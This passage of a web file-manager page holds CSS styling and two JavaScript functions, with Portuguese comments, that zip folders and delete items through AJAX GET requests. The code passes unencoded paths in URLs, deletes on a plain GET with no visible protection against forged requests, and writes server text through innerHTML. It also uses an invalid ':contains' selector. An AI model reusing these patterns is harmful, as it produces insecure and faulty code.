        background-color: #218838;
    }

    .btn-clear {
        background-color: #6c757d;
        text-decoration: none;
    }

    .btn-clear:hover {
        background-color: #5a6268;
    }

    .filter-sort-container {
        background-color: #fff;
        padding: 15px;
        border-radius: 5px;
        box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
        margin-bottom: 20px;
    }

    .filter-form {
        display: flex;
        flex-wrap: wrap;
        align-items: flex-end;
        gap: 15px;
    }

    .filter-group {
        display: flex;
        flex-direction: column;
        gap: 5px;
    }

    .filter-group label {
        font-size: 12px;
        font-weight: bold;
        color: #555;
    }

    .input-small {
        padding: 5px 8px;
        border: 1px solid #ccc;
        border-radius: 4px;
        min-width: 120px;
    }

    .input-small:focus {
        outline: none;
        border-color: #007bff;
        box-shadow: 0 0 3px rgba(0, 123, 255, 0.3);
    }

    .file-count {
        padding: 10px;
        background-color: #e9ecef;
        border-radius: 5px;
        margin-bottom: 10px;
        font-size: 14px;
        color: #495057;
    }

    @media (max-width: 768px) {
        .filter-form {
            flex-direction: column;
            align-items: stretch;
        }

        .filter-group {
            width: 100%;
        }

        .input-small {
            width: 100%;
        }

        .file-item {
            flex-direction: column;
            align-items: flex-start;
        }

        .file-actions {
            margin-top: 10px;
            flex-wrap: wrap;
        }
    }
</style>

<script>
    function compactarPasta(path) {
        // Mostrar feedback visual
        var btn = event.target;
        var textoOriginal = btn.innerText;
        btn.innerText = 'Compactando...';
        btn.disabled = true;

        // Fazer requisição AJAX
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '?zip=' + path + '&ajax=1', true);
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4) {
                btn.innerText = textoOriginal;
                btn.disabled = false;

                if (xhr.status === 200) {
                    try {
                        var response = JSON.parse(xhr.responseText);
                        if (response.success) {
                            // Mostrar mensagem de sucesso
                            var alertDiv = document.createElement('div');
                            alertDiv.className = 'alert success';
                            alertDiv.innerHTML = 'Compactação concluída! Baixando ' + response.filename + '...';

                            // Inserir alerta no topo da página
                            var container = document.querySelector('.file-list') || document.body;
                            container.parentNode.insertBefore(alertDiv, container);

                            // Iniciar download automaticamente
                            var iframe = document.createElement('iframe');
                            iframe.style.display = 'none';
                            iframe.src = response.download_url;
                            document.body.appendChild(iframe);

                            // Remover elementos após alguns segundos
                            setTimeout(function () {
                                if (alertDiv.parentNode) alertDiv.parentNode.removeChild(alertDiv);
                                if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
                            }, 5000);
                        } else {
                            alert('Erro: ' + response.error);
                        }
                    } catch (e) {
                        alert('Erro ao processar resposta do servidor.');
                    }
                } else {
                    alert('Erro na requisição. Código: ' + xhr.status);
                }
            }
        };
        xhr.send();
    }

    function excluirItem(path, btn) {
        // Confirmar exclusão
        if (!confirm('Tem certeza que deseja excluir este item? Esta ação não pode ser desfeita.')) {
            return;
        }

        // Mostrar feedback visual
        var textoOriginal = btn.innerText;
        btn.innerText = 'Excluindo...';
        btn.disabled = true;

        // Encontrar o elemento pai (file-item)
        var fileItem = btn.closest('.file-item');

        // Fazer requisição AJAX
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '?delete=' + path + '&ajax=1', true);
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    try {
                        var response = JSON.parse(xhr.responseText);
                        if (response.success) {
                            // Mostrar mensagem de sucesso
                            var alertDiv = document.createElement('div');
                            alertDiv.className = 'alert success';
                            alertDiv.innerHTML = response.message;

                            // Inserir alerta no topo da lista
                            var container = document.querySelector('.file-list') || document.body;
                            container.parentNode.insertBefore(alertDiv, container);

                            // Remover o item da lista com animação
                            if (fileItem) {
                                fileItem.style.transition = 'opacity 0.3s, transform 0.3s';
                                fileItem.style.opacity = '0';
                                fileItem.style.transform = 'translateX(-20px)';
                                setTimeout(function () {
                                    if (fileItem.parentNode) fileItem.parentNode.removeChild(fileItem);

                                    // Atualizar contagem de itens
                                    var fileCount = document.querySelector('.file-count');
                                    if (fileCount) {
                                        var fileList = document.querySelector('.file-list');
                                        var totalItems = fileList ? fileList.querySelectorAll('.file-item').length : 0;
                                        var dirCount = fileList ? fileList.querySelectorAll('.file-item strong:contains("[DIR]")').length : 0;
                                        // Simplificado - apenas atualiza o total
                                        fileCount.innerHTML = 'Total: ' + totalItems + ' itens';
                                    }
                                }, 300);
                            }

                            // Remover alerta após alguns segundos
                            setTimeout(function () {
                                if (alertDiv.parentNode) alertDiv.parentNode.removeChild(alertDiv);
                            }, 5000);
                        } else {
                            btn.innerText = textoOriginal;
                            btn.disabled = false;
                            alert('Erro: ' + response.error);
                        }
                    } catch (e) {
                        btn.innerText = textoOriginal;
                        btn.disabled = false;
                        alert('Erro ao processar resposta do servidor.');
                    }
                } else {
                    btn.innerText = textoOriginal;
                    btn.disabled = false;
                    alert('Erro na requisição. Código: ' + xhr.status);
                }
            }
        };
        xhr.send();
    }
</script>